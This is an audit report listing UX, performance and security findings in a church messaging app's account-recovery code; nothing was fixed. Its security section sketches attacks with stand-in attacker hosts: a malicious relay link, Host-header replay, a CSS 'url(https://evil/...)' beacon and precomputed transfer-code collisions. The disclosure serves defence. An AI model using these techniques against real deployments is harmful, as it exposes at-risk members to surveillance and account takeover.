# Audit — account-recovery work, 2026-07-26 (READ-ONLY, nothing fixed)

Scope: the 62 unpushed commits (`git log origin/main..main`) plus the uncommitted working tree.
Three adversarial read-only auditors: UX, performance, security. **No file was changed to address any finding.**
Suite at time of audit: **340 pass / 0 fail**. a8 live = `43fdffc` (= main HEAD at that moment).

Severity is theirs, verified by me only where noted. **Line numbers were accurate at the time of writing —
re-check before acting.** Treat every entry as a hypothesis until reproduced (that is the standing rule here).

---

## CRITICAL — 1. Phone-to-phone transfer can dead-end permanently
`app/identity.jsx` — xfer branch (~:276) vs rNoChurch branch (~:322), disabled Back (~:313)

Render branches are ordered `intro → choose → lost → xfer → rNoChurch → restoring`. `onTransferScan` sets
`xferStage='busy'`, awaits `finishRestore()`, and when no church is found `finishRestore` sets `rNoChurch` — but
`rMode` is still `'xfer'`, so the **xfer branch still wins** and the "account is back, we couldn't find your
church" screen is never reached. `rBusy` was cleared, so there is no progress text either. The only control,
Back, is `disabled={xferStage === 'busy'}`.

Member sits on "Bringing your account across…" forever; force-quit is the only escape. Relaunch does recover
(`onboarded` and `restorePending` are already written) but they have no way to know that.

Hits exactly the case the no-church screen was built for: a church on its own relay, or a slow/unreachable one.

Suggested shape: in `finishRestore`, when nothing is found, also leave the xfer mode (or add `&& !rNoChurch` to
the xfer branch); and never leave `xferStage === 'busy'` as a terminal state.

## CRITICAL — 2. "I've lost my 12 words" → "take me to my church" loops back to the welcome wizard
`app/identity.jsx` (~:268 → `goFollowChurch` ~:145), `app/app.jsx:353`, `app/app.jsx:526-534`

`trinityone.onboarded` is only written inside `finishRestore`. The `lost` route never calls it. So
`goFollowChurch` sets `openFollow`, reloads — `showOnboarding` is true again, the wizard renders over
everything, and the one-shot `openFollow` flag has **already been consumed and deleted** on mount.

The member is asked "Have you used TrinityOne before?" seconds after their steward reconnected them. If they
answer "I'm new here" they are walked through creating an account they already have.

Suggested shape: write `onboarded` in `goFollowChurch`; don't consume `openFollow` while `showOnboarding`.

## CRITICAL — 3. Reconnect does NOT restore the member's name, and three screens promise it does
`src/steward.src.js` (~:1823 pair shape, ~:2297 `emitNow` filter, ~:2310 names from kind-0),
copy at `app/identity.jsx` (~:250, ~:260) and `app/stew-dashboard.jsx` (~:2984, ~:2989)

A re-seat pair is `{old, new, at}` only. Roster names come from each pubkey's own kind-0, and the old key is
filtered out of the roster entirely. The new key has **no kind-0** — a member on the `lost` route never passes
through the name step. Net effect: "Maria" disappears and is replaced by "Anonymous …abc123".

Meanwhile the member is told "**What comes back: your name**, your church, your groups" and "same name, same
groups"; the steward is told it gives the new key "{memberName}'s name and place". Invite-only group membership
is a `members:[pubkey]` list on the group doc and is likewise not rewritten, so "same groups" is also false for
every invite-only group.

This is a promise the product does not keep — the worst class of copy bug, because the member only finds out
later. Either carry `name` in the re-seat pair (and fall back to it until the new key publishes its own kind-0)
and rewrite group membership, or change the copy to match reality. Do not leave it as it is.

## CRITICAL — 4. Restore-recovery effect publishes a kind-0 every 4 seconds, forever
`app/app.jsx:693-719` — **already committed (`43fdffc`) and live on a8**

Four compounding defects:
- `attempt` never re-reads the pending flag and the interval is never cleared; clearing `restorePending` on
  success stops nothing. 30 minutes of reading = ~450 iterations.
- `saveIdentity` → `Fellowship.setProfile` builds a **fresh kind-0 with a new `created_at` and publishes it**,
  with no diff against the cached profile. ~15 publishes/minute, ~900/hour, **broadcast to every member of the
  church** (everyone's batched `{kinds:[0],authors:[…]}` sub) and to the steward console. Self-sustaining:
  `recoverIdentity` subscribes to its own kind-0, so the republish re-satisfies `found.name` next pass. It can
  never converge to "nothing to do".
- No in-flight guard: `setInterval` does not await the async `attempt`, whose retry path can run ~23 s. Up to
  ~6 concurrent attempts, each holding a live 2-filter REQ.
- The guard meant to stop it is inert: `relaysHealthy()` returns `true` on exception **and** `true` for any
  relay whose status is not literally `false` — including never-dialled ones.

Measured shape: ~0.8 full `authors:[me]` corpus fetches/second ≈ **~18 MB/hour of metered data** and ~45
REQs/minute; on 2G this saturates the pipe continuously. Success path additionally allocates a new `churches`
array every 4 s, and `churches` is a dependency of ~12 effects → a **teardown/reopen of ~12 subscriptions every
4 seconds**, marching at the 64-sub cap.

Triggers whenever a 12-word restore finds no church — which the code itself documents as the common case. i.e.
on the device that just came back from nothing, on the worst connection it will ever have.

## CRITICAL/HIGH — 5. After a reconnect the old key stays admitted, and Block disappears with the row
`src/steward.src.js:~2297` (old key filtered from `members`) vs `app/stew-dashboard.jsx:~3201, ~3241`

`_superseded` filters the roster and the member count only — **not chat**. So the old key remains admitted, can
still read groups and post, while the steward's only Block button has just vanished with the folded row.

Losing a phone is the usual reason for losing the words. A member's phone taken at a checkpoint → steward
reconnects her believing "the old entry is folded into it" → the old key is still in the church, still posting,
with no UI to remove it.

Suggested shape: the Reconnect modal should ask "was the old phone lost or stolen?" and, if yes, block the old
key in the same action. At minimum keep re-seated keys reachable in the blocked-style list.

---

## HIGH

**6. Transfer silences the backup warning for a member who has never seen their words.**
`app/identity.jsx:~125` — `finishRestore` unconditionally writes `trinityone.backedup.<npub>='1'` ("they HAVE
the words"). True for the typed-words route; **false** for the transfer route, whose selling point is "nothing
to type". The member lands on a new phone with the backup nudge permanently dismissed, having never seen a
recovery phrase. Should be the opposite: offer the back-up step after a transfer.

**7. Offline is reported as "your church runs its own relay" and as "no church by that name".**
`app/identity.jsx:~331-333` and `~:66`; `src/fellowship.src.js` `resolveRelayName` returns `null` for a failed
fetch and a clean 404 alike. A member restoring on a bus with no signal is sent chasing a relay name, then told
the perfectly-spelled name doesn't exist. `relaysHealthy()` exists (though see #4 — it over-reports healthy).

**8. No camera = the transfer route is a dead end on BOTH phones.**
`app/identity.jsx:~300`, `app/identity-extras.jsx:~386`. `QRScanner`'s fallback says "or enter the code below"
and offers a button wired to `onCancel` — but neither transfer screen has a text field, so it bounces back.
Both payloads are already plain strings and both `sealTransfer`/`acceptTransfer` take a string, so a paste box
is the honest fix.

**9. "Settings" does not exist in the member app** — four strings send members there (`identity.jsx:~285`,
`~:379`, `~:452`, `~:408`). The real path is: tap your picture in the bottom bar → **You**. `~:285` is
load-bearing: it is the instruction the NEW phone gives for the OLD phone, so if it's wrong the transfer never
starts.

**10. Wizard step 1 still says the 12 words are not what restores you** (`identity.jsx:~452`) — "that file plus
its passphrase is what restores you onto a new phone today". The restore screen now says the opposite. A member
who reads step 1 skips writing the words down.

**11. Opening one care thread downloads every care message in the church.**
`src/fellowship.src.js:~2378`, `src/steward-meals.src.js:~378` — `{kinds:[30078], '#t':['carechat'],
'#church':[cp]}` with **no limit, no since**; the thread id is filtered client-side after the fact. Every care
message is shipped and NIP-44-decrypt-attempted, ~99% then discarded, **per thread open, every time**. ~40
threads × 20 messages ≈ 800 sealed docs ≈ 400 KB + 800 decrypt attempts to render one conversation, growing
without bound. Relay side: any `#t` filter takes the parse-every-row path, so the Pi parses the church's whole
kind-30078 corpus per subscription. Fix shape already used elsewhere here: filter on `#d` (indexed) or add a
`['req', reqId]` tag.

---

## MEDIUM

**12. Care-request stream is unbounded** (`fellowship.src.js:~2278`) — no limit/since, every request and status
doc ever, re-downloaded on every mount. Sub count is fine (deduped by `_shared`); the payload is not. Its
`emit` is also the one sibling that was **not** converted to `_coalesce` in the same commit — O(n² log n) on
backfill. Looks like an omission.

**13. The re-seat feature opens two whole-corpus REQs to read one document.**
`src/steward.src.js:~2343` (inside `subscribeMembers`) and `~:1807` (`subscribeReseats`) both use
`{authors:[pub], '#t':[NET]}` + `{'#church':[pub], '#t':[NET]}` then discard everything but one d-tag.
`steward.src.js` already uses the narrow indexed form for exactly this shape elsewhere (`'#d': [PINSERMON_D +
pub]`, `[BACKUPMETA_D + pub]`, `[MEDIAKEY_D + pub]`), and `#d` is an indexed column while `#t`/`#church` take
the row-scan path. For a 200-member church (~3,000 docs) that is ~6,000 JSON.parse + matchFilter on the Pi and
hundreds of KB over the tunnel, per console open, discarded on arrival. **The member side is clean** —
`_noteReseat` rides the existing docs hub and opens no new subscription.
Also: `setReseats` republishes the whole pairs array and nothing prunes it (~140 B/entry; no cap).

**14. Restore blocks the UI on up to 13.5 s with no cancel** (`identity.jsx` `finishRestore` awaits
`recoverIdentityRetry(2, 1500)` = 7000+1500+5000), and `app.jsx:704` uses the 23 s variant. `recoverIdentity`
fetches the member's entire authored corpus with no limit, per pass. Related: `resolveRelayName` iterates
`CANONICAL_RELAYS` **sequentially** with a 6 s abort + 6.5 s race each — ~20 s before reporting failure. Racing
them in parallel costs the same bytes and one timeout.

**15. A restored member is never offered a PIN**, and the PIN gate has no 12-word escape.
The create path has a strongly-worded PIN step; every restore path reloads straight into the app with no PIN —
on a brand-new phone, for members some of whom are in danger. Separately `importMnemonic` deliberately clears
any PIN, yet `PinUnlockGate` tells a member who forgot theirs to "reinstall the app and restore with your 12
words" — a reinstall the code does not require. "Use my 12 words instead" on the gate would work today.

**16. "Skip setup for now" on the returning-member fork removes the only way back in.**
Skip writes `onboarded`, and the wizard is the **only** 12-word restore entry in the shipped app
(`RecoverySheet`'s Restore is the backup-*file* path; `Move to a new phone` is the old phone's side; the legacy
`NostrSheet` pane is reachable only via a `?id=` URL the APK cannot carry). A returning member who taps Skip
can never restore without uninstalling. A "Restore from my 12 words" row in the You sheet fixes it.

**17. Church-name lookup flashes back to the 12-words screen mid-search** (`identity.jsx:~69`) —
`tryChurchName` clears `rNoChurch` before awaiting, so the branch stops matching and the member is thrown back
to the textarea and then forward again.

**18. Blank QR and a false "Copied" when the identity isn't ready** (`identity.jsx:~44-56`, `~:254`) — the
`myNpub` poll gives up after 6 s; the QR renders as an empty white box and Copy copies the bare prefix
`"trinityone-reseat:"` while saying "Copied — send it to your steward".

**19. Reconnect accepts a key that already belongs to another member** (`stew-dashboard.jsx:~2963` — `same`
only checks `newPub === member`). Two people in front of the steward, wrong code scanned: B's key becomes A's
successor, A's real key never gets in, A's row disappears.

**20. Closing the Reconnect modal mid-publish leaves it half-done** — `setReseats` then `setAdmitted` are two
publishes and the backdrop tap dismisses during "Reconnecting…".

**21. `_noteAdmitted`'s persisted one-shot degrades under storage pressure** — the in-memory claim correctly
kills the old self-feeding storm (verified by the auditor, who tried to break it), but the localStorage flag is
best-effort and this app persists up to 3 MB/church. With a full quota, every cold start re-runs a full-corpus
refetch + `announceMembership`. Once per launch, not a storm — but a whole church corpus on a 2G cold start.

---

## LOW

**22.** A relay round-trip per care-chat message sent — `sendCareChat` calls `_fetchCareTeam(cp)` (a
`querySync`) on **every** message for a doc that changes monthly and is already in the docs hub.
**23.** The `deletions` table is still uncapped (a tombstone is recorded even for an unheld target, and nothing
culls it). At `MAX_DELETE_TAGS = 64` it is a slow leak, not a lever.
**24.** a11y nit: the re-seat npub is 11px in `--ink-3` (`identity.jsx:~256`) and is the string a member may
have to read aloud. 13px at `--ink-2` costs nothing.

---

## Explicitly clean (checked, nothing found)

- **Relay-side (`gateway.mjs`, `event-store.mjs`)** — `MAX_DELETE_TAGS = 64` bounds the kind-5 amplification
  (closing a 14,000-tag / 900 ms / 5.4 MB case); `backfillDeletions` is watermarked on both populations;
  the negentropy change avoids the non-converging-bucket loop; the E1 `_scanBudget` (300k rows) is shared
  across a REQ's filters; `isDeleted` adds one indexed PK lookup per `put()`.
- **The `_coalesce`/`_shared`/`_docsHub` refactor is a real win** — kills an O(handlers × corpus) replay across
  ~17 handlers, stops a daily ~1.5 MB chat re-download, stops a whole-church fetch per room open, the outbox
  45 s → 15 min backoff stops a radio-wake drain, and `_coalesce().cancel()` closes a genuine
  leaked-subscription-per-church-switch bug. Every teardown path was checked for a missing `.cancel()`.
- **First paint** — no new work added ahead of it; cache-paint-then-refresh applied consistently in new code.
- **Irreversible actions in the new restore code** — the only identity-replacing call reachable from the new
  flows runs inside first-run onboarding, where the key being replaced is seconds old. The backup-file restore,
  which CAN replace a live key, does confirm. `endTransfer()` correctly drops the throwaway key on Back.
- **The check-code UX on both sides**, and the copy about it, is accurate.
- **The "what doesn't come back" copy** (`identity.jsx:~261`, `stew-dashboard.jsx:~2989`) on sealed messages and
  care records is exactly right — keep verbatim.
- **New steward modal a11y** — `CkModal` has `role="dialog"`, `aria-modal`, `aria-label`, Escape, focus
  management, 40×40 close target. Reconnect inherits it.
- **No error state anywhere in the new code is conveyed by colour alone** — every error is a sentence.

## Consistency note

The legacy `NostrSheet` restore pane (`app/screens-chat.jsx:~104-107`) calls `importMnemonic` and toasts
"Identity restored" with no confirmation, no church lookup and no `onboarded` write. Unreachable in the APK, but
it is the exact duplicate this work replaced — deleting it removes a divergence rather than leaving two answers.

---

# SECURITY findings (same read-only audit)

## HIGH — S1. The care-team roster is trusted from ANY author, so an "ask for help" can be sealed to an attacker
`src/fellowship.src.js:235-242` (`_fetchCareTeam`), duplicated inline at `~2231-2238` (`publishCareRequest`),
consumed at `~2363` (`sendCareChat`).

`querySync` for `careteam:<cp>`, newest-wins, **no author check**. Every other church-authored doc in that file
gates on `e.pubkey === cp || _churchRoster.get(cp).has(e.pubkey)` (lines ~156, ~183, ~575, ~636, ~2000) — and
`careteam:` is the doc that decides *who the crown-jewel secret is encrypted to*.

Attack, no insider needed: a crafted link `?follow=<real church npub>&relay=wss://attacker/relay` is accepted
(`app/app.jsx:~562` enforces `wss://` only, explicitly "NOT a trust check"), so the attacker's relay joins
`churchRelays()`. It serves a `careteam:` doc signed by the attacker with a newer `created_at`. The member taps
"Ask for help" and writes about an abusive spouse or an arrest; `recips` now includes the attacker, the wrapped
content key is published to **all** relays including theirs → full plaintext, plus the whole subsequent thread.

Why existing guards miss it: `accept()` (`gateway.mjs:~1302`) restricts `careteam:` writes on *compliant*
relays — the attacker supplies his own. `canRead` governs what a relay serves, not what the client chooses to
encrypt to. The NIP-65 `enforces` probe only covers relays adopted from the church's *signed* list.

## HIGH — S2. Child-safe groups are the only chat still readable by an ANONYMOUS connection
`scripts/gateway.mjs:1566-1571`

`if (g && !GROUP_CHILDSAFE.has(g)) { if (!authed) return false; … }` then
`if (!g || GROUP_VIS.get(g) !== 'invite') return true;` — so a child-safe, non-invite group is served to anyone.
An unauthenticated `REQ {kinds:[1],"#t":["trinityone"]}` plus `{kinds:[0]}` (kind-0 is unfiltered at `~1558`)
yields message text, author pubkeys, timing and **real names** for the youth/kids groups of a persecuted church.

**Not a regression** — before this diff all open groups were anon-readable. But the change inverts the shape so
the only remaining anonymously-readable chat is exactly the rooms containing children, which is the opposite of
the comment's intent. `relay-childsafe.test.mjs` never issues an *unauthenticated* read, which is why it passed.

## HIGH — S3. The NIP-42 relay-binding fix compares the auth against a CLIENT-SUPPLIED Host header
`scripts/gateway.mjs:3345` (`ws._host` from `req.headers.host`) and `3485-3487` (`boundToUs`)

The upgrade handler checks only path and connection ceiling — no Host allowlist — and the relay never consults
its own known public name (`cfPublicWss()`, `RELAY_NAMES`). So a hostile relay opens a socket to the church
relay **sending `Host: h.evil`** (one line with the `ws` client), harvests a challenge, presents it to the
member's app as its own, and replays the signed answer. `boundToUs` compares `h.evil` against the Host the
attacker set. Auth succeeds **as that member** → their DMs, the roster, safeguarding lists.

This is precisely the replay the fix was written to close. `relay-auth-binding.test.mjs:76-83` passes because
its client connects with `Host: 127.0.0.1`, so it tests `evil.example.com ≠ 127.0.0.1` — a tautology.
**a8 happens to be safe** (Cloudflare rewrites Host to the tunnel hostname); every self-hosting church,
LAN/port-forwarded relay, Tailscale Funnel and the desktop relay app is not.

## MEDIUM — S4. A care request can be silently withdrawn by someone who is not its author
`src/fellowship.src.js:~2289` (tombstone), `~2283` (status)

`if (e.tags.some(t => t[0] === 'deleted')) { … byId.delete(id); }` — no author check. This diff applies the
opposite rule to **eight** other doc types with eight identical comments ("a tombstone is only honoured from an
author who could have written the doc in the first place"): groups, categories, plans, devotionals,
services/rotas, group events, serving requests, and care needs (which got a whole `careDelOk` apparatus). Care
requests — the most sensitive of the set — are the one place it was not applied. Same for `carereqstatus:`.

Any member may publish a `carereq:<id>` doc, and `canRead` serves every one to the care team, so a member who
learns a request id can make it vanish from the queue with no trace. The realistic victim is someone whose
abuser is in the congregation. `isDeleted`'s per-pubkey keying stops the *relay-side* forgery; this is a
separate client-side mis-keying by `d`-tag alone.

## MEDIUM — S5. The transfer's only MITM defence is a 20-bit, PRECOMPUTABLE code  ← introduced today
`src/identity.src.js:31-40`

The cryptography is sound (NIP-44 to a fresh receiver key, throwaway sender key, mnemonic never rendered,
`xferSk` memory-only and nulled only after a successful decrypt). The integrity of the whole scheme rests on the
member comparing the 4-character code — and that code is `A[h[i] % 32]` × 4 = **exactly 2^20**, over an alphabet
of 32, as a **pure function of a public key**. So it is precomputable offline: grind ~5M keypairs once, index by
code, and every possible code has an instant match forever.

Attack: a hostile member in the room reads the code off the new phone's screen (26px, designed "so it can be
read aloud"), presents a pre-ground QR whose code collides, gets the old phone to scan it, photographs the reply
QR — which the design comment says "can be done in a room full of people without care" — and decrypts the 12
words. **Both phones showed matching codes, so the member was told everything was fine.** Permanent account
takeover including any steward seat.

Secondary: `acceptTransfer` authenticates nothing about the sender and there is no confirmation screen showing
the recovered npub/name before adoption, so the reverse (adopting an attacker-held identity) is also silent.

Correct fix is a short authentication string over the **whole transcript** (both public keys, ideally the
ciphertext too), displayed only after both sides have exchanged — so it cannot be precomputed from one public
key — and materially longer than 20 bits. Lengthening the current code alone is not sufficient.

## MEDIUM — S6. Permanent, un-cullable tombstone rows let any member grow the relay DB without bound
`scripts/event-store.mjs:207-215`, `scripts/gateway.mjs:1021-1029`

`applyDeletion` inserts a `deletions` row even when the relay does not hold the target; the table comment says
tombstones "are kept forever"; `cull()` trims `events` only. `MAX_DELETE_TAGS = 64` is per event and the comment
concedes "a real bulk delete just sends more of them". With a 100 msg/s/connection limit and deliberately **no
per-IP connection cap**, one accepted member can sustain ~6,400 permanent rows/second per socket. Target
hardware is a 1 GB Raspberry Pi, and `MAX_EVENTS` does not see these rows.

A **weakening relative to what it replaced** (previously a bare `store.del` with no persistent artefact). The
tombstone fix itself is correct and necessary — it just brought an unbounded write amplifier.

## MEDIUM — S7. The identity bundle grew 45% by barrel-importing nostr-tools  ← introduced today
`src/identity.src.js:12` — `import { nip44 } from 'nostr-tools';`

Every other import in that file is a deep subpath, and `src/fellowship.src.js:8` already does this correctly as
`from 'nostr-tools/nip44'`. The barrel took `vendor/identity.js` from 282,310 → 408,911 bytes (**+127 KB**,
+4,316 lines) for one function, and linked a full relay `WebSocket`, `fetch`, NIP-05/LNURL and NWC/wallet stack
into the boot-critical module that owns the 12 words. None of it is *called*, so this is not an active leak —
but it is resident in a classic script, raises the duplicate-top-level-global risk the project already scans
for, and +127 KB on first launch works directly against the thin-pipe test. One-word fix.

## LOW / informational (security)

- `app/stew-schedule.jsx:~801, ~881, ~961` — `background: e.accent` and `color-mix(… ${e.accent} …)` render a
  relay-published value into CSS with **no `safeCssColor`**, and `subscribeGroupEvents` accepts member-authored
  events carrying `['p'|'church', cp]`. An empowered group leader can set `accent: url(https://evil/?s=1)` and
  beacon the steward's IP and console-open time (CSP allows `img-src https:`). The steward console has no
  `safeCssColor`/`safeImgUrl` at all, unlike the member app. **Pre-existing** — but `:801` is a line this diff
  rewrote and `:881` newly carries `image: e.image` through the same path.
- The `reseat:` doc stores an `old → new` pubkey linkage **in cleartext**, member-readable (necessarily, for the
  directory de-dup). A seized relay therefore gets a permanent same-person correlation record. Deliberate
  trade-off, but state it explicitly.
- `_noteAdmitted` (`fellowship.src.js:~187`) is the one hub consumer in that file with no `_churchVoice` author
  guard. Harmless today (write is gated relay-side; effect is only a re-announce + refetch).
- `app/identity.jsx:~149` — the restore pane's reset effect clears `xfer` state but never calls `endTransfer()`,
  so `xferSk` survives in memory if the sheet closes by any route other than Back. Memory-only.

## Clean categories — explicitly checked

- **Relay authorisation for every new d-tag prefix: clean.** `reseat:`, `careteam:` and `carereqstatus:` are
  each gated to the church key or a current steward/care-admin of the *named* church and never reach the generic
  member rule; `reseat:` is correctly in `CP_SUFFIXED_D`. `carereq:`/`carechat:` fall through deliberately as
  validation-only guards so the per-member doc cap still binds them — right, not an oversight. kind-30078
  default-deny holds; nothing new in the public allowlist.
- **Key handling: clean apart from S5.** The mnemonic reaches no log, event, QR, or storage beyond the
  documented web-only key. `sealTransfer` refuses when PIN-locked. The throwaway key is genuinely one-shot, so a
  captured reply QR cannot be replayed into a second device.
- **Impersonation / privilege: clean.** Re-seat transfers no authority — `stewardOf`/`careAdmin` never consult
  the map; both clients verify church-or-current-steward authorship, so revocation is immediate and a hostile
  relay cannot inject one.
- **Cross-church tenancy: clean and materially improved** (`idOwnerOk`, the `careAdmin` `src.cp === cp` pin, and
  the scoping of `isLeader` close real holes). No new violation found.
- **Untrusted render in the MEMBER app: clean** — `safeCssColor`/`safeImgUrl` applied at every new sink; the
  three new `dangerouslySetInnerHTML` sites render locally-generated `qrSVG()` only. The app-link handler is
  well built (scheme/host/path pinned, `invite` deliberately excluded, only a URL hash persisted).
